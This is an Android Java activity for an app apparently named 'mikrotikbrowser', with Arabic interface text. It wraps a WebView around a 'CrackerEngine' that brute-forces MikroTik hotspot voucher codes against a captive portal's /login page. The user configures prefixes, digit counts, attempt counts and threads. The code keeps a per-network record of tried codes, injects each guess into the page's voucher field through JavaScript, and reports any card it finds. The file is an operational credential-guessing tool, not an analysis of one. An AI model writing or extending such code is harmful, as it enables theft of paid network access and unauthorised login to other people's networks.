package com.example.mikrotikbrowser;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.webkit.*;
import android.widget.*;
import java.net.URI;

public class MainActivity extends Activity implements CrackerEngine.Listener {
    private WebView webView;
    private EditText urlBar;
    private ProgressBar progressBar;
    private LinearLayout panel;
    private ScrollView logScroll;
    private TextView logText, voucherResult, statusText;
    private EditText etPrefix, etSuffix, etDigits, etAttempts;
    private EditText etPause, etRetry, etStatusEvery, etRttEvery;
    private SharedPreferences prefs;
    private StringBuilder logBuf = new StringBuilder();
    private Handler uiHandler = new Handler(Looper.getMainLooper());
    private boolean logUpdatePending = false;
    private String currentNetwork = "default";
    private CrackerEngine engine;

    @SuppressLint("SetJavaScriptEnabled")
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        prefs = getSharedPreferences("finder", MODE_PRIVATE);

        webView = findViewById(R.id.webView);
        urlBar = findViewById(R.id.urlBar);
        progressBar = findViewById(R.id.progressBar);
        panel = findViewById(R.id.panel);
        logScroll = findViewById(R.id.logScroll);
        logText = findViewById(R.id.logText);
        voucherResult = findViewById(R.id.voucherResult);
        statusText = findViewById(R.id.statusText);
        etPrefix = findViewById(R.id.etPrefix);
        etSuffix = findViewById(R.id.etSuffix);
        etDigits = findViewById(R.id.etDigits);
        etAttempts = findViewById(R.id.etAttempts);
        etPause = findViewById(R.id.etPause);
        etRetry = findViewById(R.id.etRetry);
        etStatusEvery = findViewById(R.id.etStatusEvery);
        etRttEvery = findViewById(R.id.etRttEvery);

        etPrefix.setText(prefs.getString("prefix", ""));
        etSuffix.setText(prefs.getString("suffix", ""));
        etDigits.setText(prefs.getString("digits", "2"));
        etAttempts.setText(prefs.getString("attempts", "1000"));
        etPause.setText(prefs.getString("pause", "100"));
        etRetry.setText(prefs.getString("retry", "1500"));
        etStatusEvery.setText(prefs.getString("statusEvery", "50"));
        etRttEvery.setText(prefs.getString("threads", "15"));

        CookieManager.getInstance().setAcceptCookie(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);

        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        s.setAllowFileAccess(true);
        webView.setBackgroundColor(0xFF000000);

        webView.setWebViewClient(new WebViewClient() {
            @Override public void onPageFinished(WebView v, String u) {
                urlBar.setText(u);
                progressBar.setVisibility(View.GONE);
            }
        });
        webView.setWebChromeClient(new WebChromeClient() {
            @Override public void onProgressChanged(WebView v, int p) {
                progressBar.setProgress(p);
                progressBar.setVisibility(p < 100 ? View.VISIBLE : View.GONE);
            }
        });

        findViewById(R.id.btnGo).setOnClickListener(v -> navigate());
        findViewById(R.id.btnBack).setOnClickListener(v -> { if (webView.canGoBack()) webView.goBack(); });
        findViewById(R.id.btnForward).setOnClickListener(v -> { if (webView.canGoForward()) webView.goForward(); });
        findViewById(R.id.btnRefresh).setOnClickListener(v -> webView.reload());
        findViewById(R.id.btnFinder).setOnClickListener(v -> {
            panel.setVisibility(panel.getVisibility() == View.VISIBLE ? View.GONE : View.VISIBLE);
        });
        findViewById(R.id.btnStart).setOnClickListener(v -> startCracker());
        findViewById(R.id.btnStop).setOnClickListener(v -> stopCracker());
        findViewById(R.id.btnClear).setOnClickListener(v -> clearAll());

        webView.loadUrl("http://connectivitycheck.gstatic.com/generate_204");
    }

    private void navigate() {
        String u = urlBar.getText().toString().trim();
        if (u.isEmpty()) return;
        if (!u.startsWith("http")) u = "http://" + u;
        webView.loadUrl(u);
    }

    private void clearAll() {
        new AlertDialog.Builder(this)
            .setTitle("مسح شامل")
            .setMessage("سيتم مسح كل الأرقام المجربة والكوكيز. هل أنت متأكد؟")
            .setPositiveButton("نعم", (d, w) -> {
                if (engine != null) { engine.stop(); engine = null; }
                prefs.edit().remove("tried_" + currentNetwork).apply();
                CookieManager.getInstance().removeAllCookies(null);
                CookieManager.getInstance().flush();
                logBuf.setLength(0);
                logText.setText("🗑️ تم المسح.\n");
                statusText.setText("متوقف");
                findViewById(R.id.btnStart).setEnabled(true);
                findViewById(R.id.btnStop).setEnabled(false);
                Toast.makeText(this, "تم المسح", Toast.LENGTH_SHORT).show();
            })
            .setNegativeButton("إلغاء", null)
            .show();
    }

    private void startCracker() {
        String url = webView.getUrl();
        if (url == null || !url.contains("/")) {
            Toast.makeText(this, "افتح صفحة الدخول أولاً", Toast.LENGTH_SHORT).show();
            return;
        }
        if (!url.contains("/login")) url = url.replaceAll("/+$", "") + "/login";

        try { currentNetwork = new URI(url).getHost(); }
        catch (Exception e) { currentNetwork = "default"; }

        if (engine != null) { engine.stop(); engine = null; try { Thread.sleep(500); } catch (Exception e) {} }

        String prefix = etPrefix.getText().toString().trim();
        String suffix = etSuffix.getText().toString().trim();
        int digits = pi(etDigits, 2);
        int attempts = pi(etAttempts, 1000);
        int pause = pi(etPause, 300);
        int retry = pi(etRetry, 1500);
        int threads = pi(etRttEvery, 15);

        prefs.edit()
            .putString("prefix", prefix).putString("suffix", suffix)
            .putString("digits", String.valueOf(digits))
            .putString("attempts", String.valueOf(attempts))
            .putString("pause", String.valueOf(pause))
            .putString("retry", String.valueOf(retry))
            .putString("threads", String.valueOf(threads))
            .apply();

        logBuf.setLength(0);
        logText.setText("");
        voucherResult.setVisibility(View.GONE);
        statusText.setText("جاري التخمين...");
        findViewById(R.id.btnStart).setEnabled(false);
        findViewById(R.id.btnStop).setEnabled(true);

        try {
            engine = new CrackerEngine(this, prefs, currentNetwork, url, prefix, suffix, digits, attempts, threads, pause);
            engine.start();
        } catch (Exception e) {
            logBuf.append("❌ ").append(e.toString()).append("\n");
            logText.setText(logBuf.toString());
            findViewById(R.id.btnStart).setEnabled(true);
            findViewById(R.id.btnStop).setEnabled(false);
        }
    }

    private void stopCracker() {
        if (engine != null) { engine.stop(); engine = null; }
        statusText.setText("متوقف");
        findViewById(R.id.btnStart).setEnabled(true);
        findViewById(R.id.btnStop).setEnabled(false);
    }

    private int pi(EditText e, int def) {
        try { return Integer.parseInt(e.getText().toString().trim()); }
        catch (Exception ex) { return def; }
    }

    @Override public void onLog(final String msg) {
        runOnUiThread(() -> {
            logBuf.append(msg).append('\n');
            if (logBuf.length() > 25000) logBuf.delete(0, 15000);
            if (!logUpdatePending) {
                logUpdatePending = true;
                uiHandler.postDelayed(() -> {
                    logText.setText(logBuf.toString());
                    logScroll.post(() -> logScroll.fullScroll(ScrollView.FOCUS_DOWN));
                    logUpdatePending = false;
                }, 100);
            }
        });
    }

    @Override public void onProgress(final int cur, final int total, final String v) {
        runOnUiThread(() -> {
            statusText.setText("[" + cur + "/" + total + "] " + v);
            String js = "(function(){" +
                "var i=document.querySelectorAll('input');" +
                "for(var k=0;k<i.length;k++){" +
                "var x=i[k];" +
                "if(x.type==='text'||x.name==='username'||(x.id&&x.id.indexOf('username')>=0)||(x.id&&x.id.indexOf('voucher')>=0)){" +
                "x.value='"+v+"';x.dispatchEvent(new Event('input',{bubbles:true}));break;" +
                "}}})()";
            webView.evaluateJavascript(js, null);
        });
    }

    @Override public void onFound(final String voucher, final String statusJson) {
        runOnUiThread(() -> {
            onLog("═══════════════════════════════════");
            onLog("✅✅✅ وجد الكرت: " + voucher);
            onLog("═══════════════════════════════════");
            voucherResult.setText("✅ الكرت: " + voucher);
            voucherResult.setVisibility(View.VISIBLE);
            statusText.setText("✅ وجد: " + voucher);
            Toast.makeText(this, "✅ " + voucher, Toast.LENGTH_LONG).show();
            findViewById(R.id.btnStart).setEnabled(true);
            findViewById(R.id.btnStop).setEnabled(false);

            String js = "(function(){" +
                "var i=document.querySelectorAll('input');" +
                "for(var k=0;k<i.length;k++){" +
                "var x=i[k];" +
                "if(x.type==='text'||x.name==='username'||(x.id&&x.id.indexOf('username')>=0)||(x.id&&x.id.indexOf('voucher')>=0)){" +
                "x.value='"+voucher+"';x.dispatchEvent(new Event('input',{bubbles:true}));break;" +
                "}}})()";
            webView.evaluateJavascript(js, null);
        });
    }

    @Override public void onBackPressed() {
        if (webView.canGoBack()) webView.goBack();
        else super.onBackPressed();
    }
}
